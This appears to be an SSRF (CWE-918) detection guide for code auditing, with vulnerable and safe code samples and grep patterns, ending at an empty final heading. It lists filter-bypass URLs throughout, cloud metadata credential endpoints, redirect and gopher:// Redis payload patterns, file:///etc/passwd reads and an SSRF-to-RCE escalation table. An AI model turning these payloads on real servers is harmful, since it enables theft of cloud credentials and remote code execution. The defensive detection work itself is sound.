---
name: ssrf
description: Server-Side Request Forgery detection (CWE-918)
---

# SSRF (CWE-918)

Identify cases where user-controlled URLs or hostnames are forwarded to server-side HTTP or network clients without adequate restriction.

The core pattern: *unvalidated, user-controlled input reaches the destination argument of an outbound network call.*

## What SSRF Is (and Is Not)

**What it IS**
- HTTP client calls where URL, host, IP, or port is built from user input: `requests.get(user_url)`, `fetch(req.body.webhook_url)`
- DNS lookups or raw TCP dials to user-supplied host/port: `dns.lookup(req.query.host)`, `net.Dial("tcp", host+":"+port)`
- Remote-scheme file fetchers: `file_get_contents($user_url)`, `URI.open(url)` (OpenURI)
- Webhooks, import-from-URL, image proxies, PDF/screenshot renderers — any feature that fetches a remote resource on behalf of the user
- Stored destinations: a URL saved from user input at write time and later used for an outbound request without allowlist validation
- **Inbound-message-derived URLs**: a destination parsed out of a received email or message and fetched server-side — e.g. a webmail "one-click unsubscribe" that issues a backend request to the URL in the `List-Unsubscribe` SMTP header (`List-Unsubscribe-Post: List-Unsubscribe=One-Click`), remote-image/link-preview prefetch, or a helpdesk/ticketing system that ingests email and fetches embedded links. The sender fully controls these headers/bodies, so they are untrusted even though they never arrive as an HTTP request parameter

**What it is NOT**
- **Open redirect** — HTTP 302 to a user URL redirects the *browser*, not a server-side outbound request (see `open_redirect.md`)
- **XXE-based SSRF** — outbound requests triggered by XML external entities in a parser (see `xxe.md`)
- **XSS via URL** — rendering a user-supplied URL in HTML without escaping
- **IDOR** — changing an object ID to access another user's data
- **Client-side fetch** — the browser, not the server, performs the request
- **Hardcoded outbound calls** — fixed URLs with no user influence on the destination

## Source -> Sink Pattern

**Sources (remote flow sources)**: HTTP request parameters, headers, path segments, cookies, JSON/form body fields — anything modeled as remote user input that can carry a URL, hostname, IP, or URL fragment used to build an outbound request. Also treat **content extracted from received messages** (SMTP headers such as `List-Unsubscribe`, email/message bodies, parsed links) as remote sources when the server later fetches them — same allowlist/validation applies as for direct request input. Java excludes taint from `URLConnection.getInputStream()` responses (following a remote redirect is not worse than the remote server choosing the target).

**Sinks (`request-forgery` kind)**:
- `new URL(userInput).openConnection()`
- `HttpURLConnection` with user-controlled URL
- `RestTemplate.getForObject(userInput, ...)`
- `WebClient.create(userInput)`
- `OkHttpClient` with user-controlled URL
- `HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(userInput)))`
- `ImageIO.read(new URL(userInput))`
- `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(userInput)`
- `URLClassLoader(new URL[]{new URL(userInput)})`
- Python: any `Http::Client::Request` URL part (`requests.get`, `urllib`, `httpx`, `aiohttp`, etc.)
- JavaScript: `ClientRequest` URL or host (`http.get`, `fetch`, `axios`, `new URL(userInput)`)
- Go: `Http::ClientRequest` URL, WebSocket URL, framework-modeled sinks (`request-forgery`, `request-forgery[host]`)
- Ruby: `Http::Client::Request` URL parts; C#: outbound HTTP client URL arguments

**Additional taint steps**: assigning to `URI`/`URL` host arguments; `Properties.setProperty("jdbcUrl", tainted)` propagates to the Properties object (JDBC URL SSRF).

**Sanitizers / barriers**:
- Java: hostname-sanitizing string prefix (`?`, `#`, or `/` not in scheme position); `List.contains(url)` guard; `URI.getHost().equals("fixed")`; regexp host check; `HostnameSanitizingPrefix` append; external `request-forgery` barrier models
- Python (full SSRF): string concat/format/f-string with fixed left side excluding bare `http://`/`https://`; `isalnum`/`isalpha`/digit/identifier checks; `re.match`/`re.fullmatch`; `AntiSSRF.URIValidator.in_domain()` and Azure domain validators (models-as-data)
- Python partial SSRF: above plus constant-comparison barriers; string-restriction guards
- JavaScript: `encodeURIComponent` (path separators); external barrier models; HTML sanitizer output (additional step)
- Go: hostname-sanitizing prefix edge; `isLocalUrl`/`isValidRedirect`-style redirect checks; regexp match guards; URL/hostname equality against constant; simple-type sanitizers
- Ruby: prefixed string interpolation (fixed prefix before user part)

## Recon: Outbound Sink Grep Patterns

Flag any call where a non-hardcoded URL, host, IP, or port is passed as the destination. Trace taint in a later pass; recon is structural only.

| Stack | Grep targets (destination argument may be variable) |
|-------|-----------------------------------------------------|
| Python | `requests\.(get\|post\|put\|request)`, `urllib\.request\.urlopen`, `httpx\.`, `aiohttp\.ClientSession`, `socket\.(connect\|create_connection)`, `dns\.resolver\.resolve`, `subprocess\.(run\|Popen).*\b(curl\|wget)\b` |
| Node.js | `\bfetch\(`, `axios\.(get\|post\|request)`, `http(s)?\.(get\|request)`, `got\(`, `net\.(connect\|createConnection)`, `dns\.(lookup\|resolve)`, `exec.*\b(curl\|wget)\b` |
| Ruby | `Net::HTTP\.`, `URI\.open`, `\bopen\(`, `RestClient\.`, `HTTParty\.`, `Faraday\.` |
| PHP | `curl_setopt.*CURLOPT_URL`, `curl_exec`, `file_get_contents\(`, `fopen\(.*http`, `Guzzle.*->(get\|request)`, `HttpClient.*->request` |
| Java | `\.openConnection\(\)`, `RestTemplate\.`, `WebClient\.`, `OkHttpClient`, `HttpClients\.`, `HttpGet\(`, `Jsoup\.connect` |
| Go | `http\.(Get\|Post\|NewRequest)`, `net\.Dial`, `net\.LookupHost`, `net\.ResolveTCPAddr` |
| C# | `HttpClient\.(Get\|Post\|Send)Async`, `WebRequest\.Create`, `WebClient\.Download` |

Skip fully hardcoded literals (`requests.get("https://api.example.com/data")`). Shell-outs to `curl`/`wget`/`nc` with a variable target are SSRF sinks.

## Vulnerable Conditions
- User-supplied input reaches any HTTP or network client URL parameter with no prior validation
- URL is parsed but only the hostname or scheme is checked against a denylist, which is bypassable via DNS rebinding, IPv6, or octal notation
- Destination was stored from user input earlier (webhook URL, avatar URL) with no allowlist at write or read time
- Only scheme restriction (`https://` only) or IP blocklist — bypassable to arbitrary HTTPS hosts, alternate IP notations, or redirect chains

## Safe Patterns

Effective mitigations (classify as **Not Vulnerable** when all apply):

**Strict host allowlist** — validate/sanitize before building the request URL; resolve hostname, then check against an explicit allowlist (not substring match):

```python
ALLOWED = {"api.example.com", "cdn.example.com"}
parsed = urlparse(user_url)
if parsed.hostname not in ALLOWED:
    raise ValueError("Destination not allowed")
requests.get(user_url)
```

**URL prefix allowlist** — restrict scheme and path prefix; still parse and verify host:

```python
ALLOWED_PREFIXES = ["https://api.example.com/", "https://cdn.example.com/"]
if not any(user_url.startswith(p) for p in ALLOWED_PREFIXES):
    abort(400)
```

**Resolve then validate IP** — resolve DNS first, reject private/link-local/metadata ranges on the resolved address, and pin that IP for the connection (blocks naive blocklist-only checks; TOCTOU remains if IP is not pinned):

```python
addrs = socket.getaddrinfo(parsed.hostname, parsed.port)
if any(ipaddress.ip_address(a[4][0]).is_private for a in addrs):
    raise ValueError("Internal destination blocked")
```

**DNS rebinding / TOCTOU — SAFE pattern** — validate **on every resolution**, pin the resolved IP for the actual socket connect, and re-validate after each redirect hop; never allowlist an attacker-controlled domain without pinning:

```python
# VULN: validate once, fetch later — TTL swap or second lookup hits internal IP
if not is_private(resolve(host)):
    requests.get(url)  # DNS may rebind before connect

# SAFE: resolve → block private/metadata → connect to pinned IP with Host header
addrs = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
ip = addrs[0][4][0]
if ipaddress.ip_address(ip).is_private or ip.startswith("169.254."):
    raise ValueError("blocked")
# use custom adapter/connector binding to `ip`, set Host: {host}; disable blind redirect follow
# on manual redirect: re-parse Location, re-resolve, re-validate (no reuse of first IP)
```

**Other safe shapes**
- User input used exclusively as a query parameter on a hardcoded host, never as authority
- URL assembled from a hardcoded base with user input confined to an encoded path segment
- Redirect following disabled on the HTTP client; handle redirects manually with re-validation
- Do not forward cookies, `Authorization`, or other auth headers to user-chosen destinations
- Normalize (IDNA/punycode, Unicode NFC) **before** allowlist comparison; reject URLs whose normalized host differs from raw parse

> IP blocklists alone (`169.254.0.0/16`, `10.0.0.0/8`, …) are **not** sufficient — bypass via DNS rebinding, URL encoding, IPv6/decimal notation, or redirect chains. Treat blocklist-only code as Likely Vulnerable.

## Evasion Patterns
- `http://127.0.0.1` vs `http://0x7f000001` vs `http://[::1]` vs `http://localhost`
- DNS rebinding: domain resolves to an internal IP address after the initial check completes
- URL parser differentials: `http://evil.com@127.0.0.1`
- Redirect (30x) bypass: an allowlisted host responds with a `Location:` to an internal target — covers the full 3xx family plus non-standard codes (e.g. `332`) and `Location`/`Content-Location` on `201`/`200`, not just 301/302 (see "SSRF via Redirect Chain (30x Bypass)")
- Scheme switch on redirect: `Location: gopher://`/`file://`/`dict://` escapes a scheme allowlist enforced only on the first URL — escalates a read-only fetch to an RCE/LFI primitive
- Fake-extension / content-type proxy bypass: an allowlisted `…/thumb.jpg` (or `.json`/`.csv`/`.xml`/`.pdf`) redirects to metadata — URL-extension and first-response content-type checks prove nothing about the final host
- WHATWG vs RFC3986 parser split: backslash treated as path separator in some fetch stacks — `http://allowed.com\@169.254.169.254/` may pass allowlist on one parser while the HTTP client requests the host after `@`
- Normalize-before-allowlist: blocklist/allowlist applied to raw string before Unicode NFC/NFKC collapse, percent-decoding, or IDNA punycode conversion — attacker smuggles forbidden host through alternate representation
- Metadata path/fragment: `http://169.254.169.254#@allowed.com` or `http://metadata/expected#@attacker` — validator reads fragment/host differently than fetch client
- Unicode / IDN / enclosed alphanumerics: fullwidth digits (`１２７.０.０.１`), homoglyphs, `xn--` punycode, or enclosed alphanumeric Unicode (`ⓛⓞⓒⓐⓛⓗⓞⓢⓣ`) bypass ASCII-only blocklists until IDNA normalization

### IP-encoding canonicalization matrix

All of the following resolve to the **same** address (`127.0.0.1` / `169.254.169.254` shown). A validator that string- or regex-matches the host, or checks only dotted-quad form, misses every alternate encoding. The **SAST takeaway**: flag any host/IP check that does not first parse the host to its canonical packed form (4-byte IPv4 / 16-byte IPv6) and then range-check; treat regex/`startswith`/`in`-string host checks as bypassable.

| Encoding | Example (`127.0.0.1`) | Example (`169.254.169.254`) |
|----------|----------------------|------------------------------|
| Dotted decimal (canonical) | `127.0.0.1` | `169.254.169.254` |
| Dotless decimal (32-bit) | `2130706433` | `2852039166` |
| Dotted hex | `0x7f.0x0.0x0.0x1` | `0xa9.0xfe.0xa9.0xfe` |
| Dotless hex | `0x7f000001` | `0xa9fea9fe` |
| Dotted octal | `0177.0.0.01` | `0251.0376.0251.0376` |
| Padded octal | `00177.00000.00000.000001` | `0000251.0376.0251.0376` |
| Dotted-decimal overflow (+256) | `383.256.256.257` | `425.510.425.510` |
| Short / partial form | `127.1`, `0177.1`, `0x7f.1` | `169.254.43518` |
| Mixed base (hex+oct+dec per octet) | `0x7f.0.0.1`, `0177.0.0x0.1` | `0xa9.0376.43518` |
| IPv6 compact mapped IPv4 | `[::127.0.0.1]` | `[::169.254.169.254]` |
| IPv6 v4-mapped | `[::ffff:127.0.0.1]` | `[::ffff:169.254.169.254]` |
| IPv6 with zone-id suffix | `[::127.0.0.1%2516]` | `[::ffff:169.254.169.254%2516]` |
| All-zeros / unspecified | `0.0.0.0`, `[::]`, `0` | — |

### Authority-confusion matrix

The host the **validator** parses differs from the host the **HTTP client** connects to, because of userinfo (`@`), delimiters, whitespace, or duplicate markers. Allowed host on the left of the confusion, internal target embedded:

| Trick | Example |
|-------|---------|
| Userinfo split | `http://allowed.com@169.254.169.254/` |
| Double / triple `@` | `http://allowed.com@@169.254.169.254/`, `http://allowed.com@@@169.254.169.254/` |
| Query / fragment before `@` | `http://169.254.169.254:80?@allowed.com/`, `http://169.254.169.254:80#@allowed.com/` |
| Combo userinfo+fragment | `http://169.254.169.254:80+&@allowed.com#+@allowed.com/` |
| Whitespace injection | `http://169.254.169.254%09allowed.com/`, `http://169.254.169.254%2509allowed.com/`, `http://169.254.169.254%20allowed.com/`, backslash-tab variants |
| Delimiter confusion | `http://169.254.169.254;allowed.com:80/`, `http://169.254.169.254,allowed.com:80/` |
| Scheme `0://` | `0://169.254.169.254:80;allowed.com:80/` |
| Port confusion | `http://169.254.169.254:80:80/`, `http://allowed.com:80+&@169.254.169.254:22/` |

### Alternate host separators and Unicode digits

- **Alternate "dots"** normalized to `.` by some resolvers/IDNA: ideographic full stop `。` (U+3002), halfwidth `｡` (U+FF61), fullwidth `．` (U+FF0E) — e.g. `http://169。254。169。254/`, `http://169｡254｡169｡254/`.
- **Circled / enclosed / styled digit octets**: circled digits (`①②③…`), and mathematical/fullwidth digit families all NFKC-fold to ASCII digits — e.g. `http://⑯⑨。②⑤④。⑯⑨｡②⑤④/`, dotless-hex circled `http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/`, dotless-decimal circled `http://②⑧⑤②⓪③⑨①⑥⑥:80/`.
- **IDNA mapping abuse**: characters that expand on IDNA/`ToASCII` (e.g. `ß` → `ss`) let an attacker register/route a name that normalizes into an allowlisted or internal host after conversion.
- **SAST takeaway**: any allowlist/blocklist compared against the raw or once-decoded host is bypassable. Require: parse with one library → IDNA/`ToASCII` encode → NFKC normalize → resolve → canonical-IP range check → pin IP for connect.

## Business Risk
- Unauthorized access to internal services such as metadata endpoints and admin panels
- Cloud metadata credential theft (AWS `169.254.169.254`, GCP, Azure IMDS)
- Internal network port enumeration
- Local file disclosure via `file://` protocol when the client supports it

## Java Source Detection Rules

### TRUE POSITIVE: User-controlled URL to server-side HTTP client
- External input controls the full URL or the target authority (`scheme://host:port`) that is passed to a server-side network client.
- Java sinks include `new URL(url).openConnection()`, `openStream()`, Apache HttpClient, `RestTemplate`, `WebClient`, `Jsoup.connect(...)`, and comparable outbound fetch APIs.
- Wrapper methods still qualify when the call chain traces from `@RequestParam` or other external input through a helper method to an outbound request.

### FALSE POSITIVE: Fixed or configuration-only outbound target
- A hardcoded URL, application property, service discovery endpoint, or other server-controlled configuration value used in `RestTemplate` or `URL.openConnection()` is not SSRF when request data cannot influence the destination.
- Do not flag a helper method or sink in isolation when no demonstrated path from external input to the requested URL exists.

### FALSE POSITIVE: Duplicate sink-only report
- A utility method such as `httpRequest(String requestUrl)` is not a standalone finding unless a specific externally controlled caller is identified.
- When the same external-input-to-sink path is already captured through the reachable controller endpoint, do not emit a second SSRF finding for the internal helper in isolation.
## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `requests.get(user_url)` — URL fully controlled by user
- **VULN**: `urllib.request.urlopen(user_input)`
- **VULN**: `requests.get(f"http://{user_host}/api")` — host portion is user-controlled
- **VULN**: `httpx.get(user_url)` / `httpx.AsyncClient().get(user_url)` — httpx follows same pattern as requests
- **VULN**: `aiohttp.ClientSession().get(user_url)` — async HTTP client with user-controlled URL
- **SAFE**: URL allowlist validation + only specific domains permitted

### JavaScript (Node.js)
- **VULN**: `axios.get(req.body.url)` — URL fully controlled by request body
- **VULN**: `fetch(req.query.url)`, `http.get(userUrl, ...)`
- **SAFE**: Fixed base URL with only the path portion user-controlled and validated

### PHP
- **VULN**: `file_get_contents($_GET['url'])` — PHP wrappers support `file://`, `http://`, `php://`
- **VULN**: `curl_setopt($ch, CURLOPT_URL, $_POST['url'])`
- **VULN**: `$data = file_get_contents("http://" . $_GET['host'] . "/api")`
- **PARTIAL HARDENING (not a complete SSRF fix)**: `curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS)` — restricts scheme only; does not block SSRF to attacker-chosen HTTPS hosts (external targets, internal HTTPS services, some metadata endpoints). Host/IP allowlisting (and blocking link-local/private ranges after DNS resolution) is still required.

## Vulnerable vs Secure Examples (Ruby, Go, C#)

### Ruby — Net::HTTP / OpenURI

```ruby
# VULNERABLE: open() fetches arbitrary URL
def import
  url = params[:url]
  content = URI.open(url).read
end

# SECURE: restrict scheme and host before open
def import
  url = params[:url]
  uri = URI.parse(url)
  raise "Forbidden" unless uri.is_a?(URI::HTTPS) && uri.host == "data.example.com"
  content = uri.open.read
end
```

### Go — net/http

```go
// VULNERABLE: user-supplied URL passed to http.Get
func proxyHandler(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("url")
    resp, _ := http.Get(target)
    io.Copy(w, resp.Body)
}

// SECURE: allowlist host after parse
func proxyHandler(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("url")
    u, err := url.Parse(target)
    if err != nil || u.Hostname() != "api.example.com" {
        http.Error(w, "Forbidden", 403)
        return
    }
    resp, _ := http.Get(target)
    io.Copy(w, resp.Body)
}
```

### C# — HttpClient

```csharp
// VULNERABLE: user-supplied URL passed to HttpClient
[HttpGet("proxy")]
public async Task<IActionResult> Proxy([FromQuery] string url)
{
    var response = await _httpClient.GetAsync(url);
    return Content(await response.Content.ReadAsStringAsync());
}

// SECURE: allowlist host before request
[HttpGet("proxy")]
public async Task<IActionResult> Proxy([FromQuery] string url)
{
    if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) ||
        uri.Host != "api.example.com")
        return Forbid();
    var response = await _httpClient.GetAsync(url);
    return Content(await response.Content.ReadAsStringAsync());
}
```

## Cloud Metadata Endpoint Exposure

```java
// VULNERABLE: fetching user-controlled URL that can reach cloud metadata
// AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
// GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
// Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
// These endpoints return cloud credentials when hit from the server

// VULN indicator: any URL fetch with user-controlled host/path that is NOT blocked
// by allowlist — cloud metadata IPs must be explicitly blocked
String url = request.getParameter("url");
restTemplate.getForObject(url, String.class);  // no IP allowlist check
```

### What to flag: Any HTTP client call with user-controlled URL where there is NO:
- IP blocklist that includes `169.254.169.254`, `metadata.google.internal`, `169.254.170.2`
- Scheme allowlist restricting to `https://` only on specific domains
- Host/IP validation against an allowlist

## SSRF via URL Parser Differentials

```java
// VULNERABLE: validation checks parsed URL but request uses raw input
// Parser differential: java.net.URL vs Apache HttpClient may parse differently
String url = request.getParameter("url");
URL parsed = new URL(url);
// Allowlist check on parsed.getHost() — but HTTP client may follow redirect
// to internal target after passing host check

// VULNERABLE: URL with credentials bypasses host-based allowlist
// http://allowed.com@169.254.169.254/ — some parsers use the part after @ as host
// http://169.254.169.254#allowed.com — fragment ignored by some validators
```

### WHATWG vs RFC3986 — Backslash and Userinfo Split

Some HTTP clients (WHATWG URL algorithm) treat `\` as `/` and normalize `http://allowed\@attacker/` differently from RFC3986 parsers used in validators:

```text
http://allowed.com\@169.254.169.254/latest/meta-data/
http://allowed.com\169.254.169.254/
```

**VULN condition**: allowlist/blocklist runs on `java.net.URL`, `urlparse`, or regex over raw string; outbound `fetch`/`HttpClient`/`requests` uses a different parser — host seen by validator ≠ host connected.

**Grep seeds**: dual parse paths (`new URL` + `HttpClient`), `normalize.*url` after allowlist check, `allowedHosts.includes(host)` on pre-decode string.

**SAFE**: single canonical parser library for validate and fetch; compare normalized punycode host; connect to pinned resolved IP; reject URLs containing `\`, unescaped `@` in authority, or userinfo components unless explicitly required.

### Normalize-Before-Allowlist (Recollapse)

**VULN condition**: security check on raw or once-decoded input; HTTP client applies additional decoding, Unicode normalization, or scheme-default port folding before connect:

```python
# VULN: check raw, fetch after client normalizes
if '169.254.' not in user_url:  # bypass via percent-encoding, IDNA, fullwidth chars
    requests.get(user_url)
```

**SAFE**: `urllib.parse` / WHATWG parse → IDNA encode hostname → resolve → IP range check → pin IP → fetch with redirect re-validation at each hop.

### Metadata Path / Fragment Tricks

```text
http://169.254.169.254/latest/meta-data/#@allowed.com
http://metadata.google.internal/#@cdn.example.com
```

Validators that strip fragments or compare only the pre-`#` portion may approve a metadata URL while error messages/logging show the allowlisted fragment host. Fetch clients ignore fragment for HTTP — full request hits metadata.

**SAFE**: parse with one library; validate `hostname` from authority only (never fragment); block link-local/metadata IPs after DNS resolution regardless of fragment/userinfo.

## SSRF via Redirect Chain (30x Bypass)

The single most common way to defeat an SSRF allowlist: the attacker controls (or owns) an **allowlisted** host that answers with a redirect (`Location:`) to an internal target. The validator approves the *initial* URL; the HTTP client then **auto-follows** the redirect and connects to the host the validator never saw. Treat any user-controlled fetch that follows redirects without **re-validating every hop** as Likely Vulnerable.

**Status-code breadth** — do not reason about `301`/`302` only. Common clients follow the whole 3xx family — `300, 301, 302, 303, 305, 307, 308` — and permissive clients/`libcurl` follow **non-standard 3xx codes** (e.g. `332`, any `3xx` with a `Location`). A filter or mock that special-cases 301/302 misses the rest.

**307 / 308 preserve method and body** — unlike 301/302/303 (which may downgrade to GET), `307`/`308` replay the **original verb and body** to the redirect target — needed to reach verb-sensitive internal services (POST-only RPC, IMDSv2 `PUT`, Redis/`gopher` payloads carried in a POST body).

**Scheme switch on redirect (high value)** — scheme allowlists enforced only on the *initial* URL are bypassed when `Location:` switches scheme:
```text
GET https://allowed.com/avatar.jpg   ->   302 Location: gopher://127.0.0.1:6379/_<redis-payload>
                                            (or file:///etc/passwd, dict://127.0.0.1:6379/INFO)
```
If the client follows cross-scheme redirects, a read-only HTTP fetcher becomes a `gopher`/`file`/`dict` primitive. Cross-ref "Scheme Allowlist / Protocol Smuggling" and `rce.md`.

**Redirect to internal / alternate-encoded host** — `Location:` to `169.254.169.254`, any alternate IP encoding, `instance-data`, `metadata.google.internal`, or a rebinding host. The first-hop allowlist/IP check never runs on the redirect target. Cross-ref the IP-encoding canonicalization matrix.

**Fake-extension / content-type / response-shape bypass** — "image/JSON/CSV/XML/PDF only" proxies that validate the **request URL extension** or the **first response's `Content-Type`** are bypassed because the allowlisted `…/thumb.jpg` (right extension) responds `30x` to metadata. The redirect response can also carry a **spoofed `Content-Type`** and a valid-looking **body** (or no body), defeating checks that "the response looks like a real JPEG/JSON". The extension/content-type proves nothing about the *final* host.

**`Location` honored on non-3xx** — some clients follow `Location` on `201 Created` and `Content-Location` on `200 OK`. A validator that only inspects 3xx responses misses these.

**Non-HTTP protocol redirects** — redirect-following is not HTTP-only: an `RTSP 301`/`Location` (and other line-oriented protocols) likewise sends the client to an internal target. Flag redirect-follow on any protocol client whose target derives from user input.

### Redirect status / response-shape bypass matrix

| Trick | Example (initial → redirect) | Why the filter misses it |
|-------|------------------------------|--------------------------|
| Full 3xx family | `200`-only/301-302-only mock vs `303`/`305`/`307`/`308` Location | Validator/test reasons about 301/302 only |
| Non-standard 3xx | `HTTP/1.1 332` + `Location: http://169.254.169.254/` | libcurl/permissive clients still follow |
| Method/body preserving | `308 Location: http://169.254.169.254/...` on a POST | 307/308 replay verb+body to internal target |
| Scheme switch | `302 Location: gopher://127.0.0.1:6379/_…` | Scheme allowlist checked on first URL only |
| Internal/alt-encoded host | `302 Location: http://0xa9fea9fe/` | Host/IP check never re-runs on `Location` |
| Fake extension | `GET /thumb.jpg` → `301` → metadata | URL-extension allowlist passes on first hop |
| Content-type/body spoof | `301` carrying `Content-Type: image/jpeg` + fake body → metadata | Response-shape check trusts the redirect, not final host |
| `Location` on 201/200 | `201`/`200` + `Location`/`Content-Location` | Validator only inspects 3xx |
| Non-HTTP redirect | `RTSP/1.0 301 Location: http://169.254.169.254/` | Redirect-follow not limited to HTTP |

### SAST signal and safe pattern

**VULN condition**: a user-controlled outbound fetch where the client **auto-follows redirects** and the destination is validated **only before the first request** (no per-hop re-check). Default-follow clients are the norm — flag them explicitly.

**SAFE**: either disable auto-follow and handle redirects manually, **or** re-validate **every hop** — re-parse `Location` → IDNA/normalize host → re-resolve DNS → block private/link-local/metadata ranges → **re-check the scheme allowlist** → pin the resolved IP for the connect — and cap with a small **max-redirect** limit.

```java
// VULNERABLE: defaults follow redirects to internal targets
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setFollowRedirects(true);          // default — follows 3xx (incl. 307/308) to internal
restTemplate.getForObject(userInput, String.class);   // RestTemplate follows by default

// SAFE: disable auto-follow; validate each hop manually before reconnecting
conn.setInstanceFollowRedirects(false);
```

```python
# VULN: requests follows redirects by default; only the first URL was checked
requests.get(user_url)                              # allow_redirects=True by default

# SAFE: no auto-follow; re-validate Location host+scheme+resolved-IP each hop, cap hops
resp = requests.get(user_url, allow_redirects=False)
# loop: parse resp.headers["Location"] -> allowlist host -> scheme in {http,https}
#       -> resolve -> reject private/metadata -> pin IP -> refetch (max N hops)
```

```javascript
// VULN: axios/fetch follow redirects by default
await axios.get(userUrl);
await fetch(userUrl);                               // redirect: 'follow' (default)

// SAFE: take manual control and re-validate each Location
await axios.get(userUrl, { maxRedirects: 0 });
await fetch(userUrl, { redirect: 'manual' });
```

```go
// SAFE: reject/re-validate redirects via CheckRedirect (default follows up to 10)
client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
    return http.ErrUseLastResponse // or validate req.URL host/scheme/resolved-IP, cap len(via)
}}
```

```php
// VULN: libcurl follows Location and (if enabled) cross-scheme redirects
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

// SAFE: don't auto-follow; if you must, constrain protocols on BOTH initial and redirect
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_PROTOCOLS,       CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); // blocks redirect->file/gopher
curl_setopt($ch, CURLOPT_MAXREDIRS,       3);
```

**Grep seeds** — redirect-following clients on a user-controlled fetch, and validators that check before the fetch but never re-check `Location`:
```bash
# default-follow or explicit-follow on outbound clients
rg -n "allow_redirects\s*=\s*True|setFollowRedirects\(true\)|setInstanceFollowRedirects\(true\)|CURLOPT_FOLLOWLOCATION|maxRedirects|redirect:\s*'follow'|FollowRedirects" --glob '*.{py,js,ts,java,go,php,rb,cs}'
# follow enabled WITHOUT a redirect-protocol restriction (cross-scheme redirect risk)
rg -n "CURLOPT_FOLLOWLOCATION" --glob '*.php' | rg -v "CURLOPT_REDIR_PROTOCOLS"
# host/allowlist validated once, then a separate fetch (no per-hop re-validation)
rg -n "allowlist|allowed.?hosts|urlparse|new URL\(|url\.Parse" -A6 --glob '*.{py,js,ts,java,go}' | rg -n "requests\.|fetch\(|axios|http\.Get|HttpClient|openConnection"
```
**SAFE**: `allow_redirects=False` / `redirect:'manual'` / `maxRedirects:0` / `CheckRedirect`, or re-run the full host+scheme+resolved-IP allowlist on each `Location` with a max-hop cap.

## Scheme Allowlist / Protocol Smuggling

When the client is **not** restricted to `{http, https}`, an attacker swaps the scheme to reach non-HTTP services and escalate beyond a read-only fetch. `java.net.URL.openConnection()` handles `file`, `jar`, `ftp`, `netdoc`; `libcurl` (PHP `curl`, shell-outs) additionally handles `gopher`, `dict`, `ldap`, `tftp`, `smtp`, `imap`, `telnet`; PHP stream wrappers add `php://`, `data://`, `expect://`.

```java
// VULNERABLE: URL client that supports non-HTTP schemes
// Java URL.openConnection() supports: file://, jar://, ftp://, netdoc://
// If curl is used server-side (via exec), gopher://, dict://, ldap:// may be available
URL url = new URL(userInput);
InputStream is = url.openStream();  // file:// reads local files — also SSRF→LFI
```

**Escalation map (why scheme restriction matters):**

| Scheme | Reachable service | Impact |
|--------|-------------------|--------|
| `gopher://` | Redis, Memcached, FastCGI/PHP-FPM, MySQL, PostgreSQL, SMTP | Arbitrary multiline protocol writes → **RCE** (cron/authorized_keys/webshell, FastCGI `PHP_VALUE`), cache poisoning, mail relay |
| `dict://` | Redis, Memcached, FTP, any line-oriented service | Single-command probe/write, service fingerprint |
| `file://` / `netdoc://` | Local filesystem | Local file disclosure (SSRF→LFI) |
| `ftp://` | FTP + (Java/Python FTP injection) | Firewall pinhole / outbound connection smuggling |
| `php://`, `data://`, `expect://` | PHP wrapper engine | LFI/RCE when `file_get_contents`/`fopen` take the URL |

`gopher://` is the highest-value escalation because it lets the attacker write **arbitrary bytes with CRLF** to a backend TCP port — Redis `CONFIG SET dir`/`save`, Memcached `set`, and FastCGI records all become RCE primitives. Cross-ref `rce.md`, `path_traversal_lfi_rfi.md`, `php_security.md`.

**SAST takeaway**: require an explicit scheme allowlist (`scheme in {"http","https"}`) **before** the outbound call; flag any client where the scheme is derived from user input or defaulted by the URL parser. Restricting scheme alone is not a full SSRF fix (host still needs allowlisting) but its absence turns SSRF into RCE.

## CRLF / Request Splitting in Outbound URL

A newline (`\r\n`, `%0d%0a`, or raw `\n`) in a user-controlled URL component (host, port, path, or a header value built from the URL) lets the attacker inject additional request headers or smuggle a **second** request to the backend. This is the mechanism behind `gopher://` payloads and also bites plain HTTP clients that do not reject control characters in the URL.

```python
# VULN: user value with CRLF reaches the request line / headers
host = request.args["host"]            # "169.254.169.254:80/%0d%0aX-Injected: 1"
requests.get(f"http://{host}/api")     # splits into attacker-controlled headers

# VULN: port/path concatenation enables protocol injection via gopher/redis
url = f"gopher://127.0.0.1:6379/_{payload}"  # payload contains %0d%0a Redis commands
```

**VULN condition**: user input flows into a URL/host/port/path that is passed to an outbound client without rejecting/encoding `\r`, `\n`, `%0d`, `%0a`, `%0d%0a` (and double-encoded `%250d%250a`). Also flag header values built from user-controlled URL parts.

**Unicode-to-latin1 truncation (Node.js <= 8)**: a control-character filter that only rejects literal `\r`/`\n` is bypassable when high-codepoint Unicode characters in the request path truncate to CR/LF bytes as the client serializes the request to the wire (latin1). E.g. `U+010D`/`U+010A` (`č`/`Ċ`) collapse to `0x0D`/`0x0A`, smuggling CRLF and splitting the outbound request. Flag user-controlled Unicode reaching the path of a zero-length-body request (GET/DELETE) on legacy Node; SAFE = build the URL from properly-encoded components and reject non-ASCII in the request target.

**Grep seeds**: `\\r|\\n|%0d|%0a|%0D%0A` adjacent to `requests\.|http\.|fetch\(|curl|urlopen|HttpClient`; f-strings/concatenation building `host:port` or header values from request input.

**SAFE**: reject any URL containing control characters before the request; build outbound requests with a single URL object (never string-concatenate authority); use clients that refuse CR/LF in the request target. Cross-ref `http_response_splitting.md`, `smuggling_desync.md`, `crlf` handling in `correlation_header_injection.md`.

## SVG Rasterization as SSRF Sink

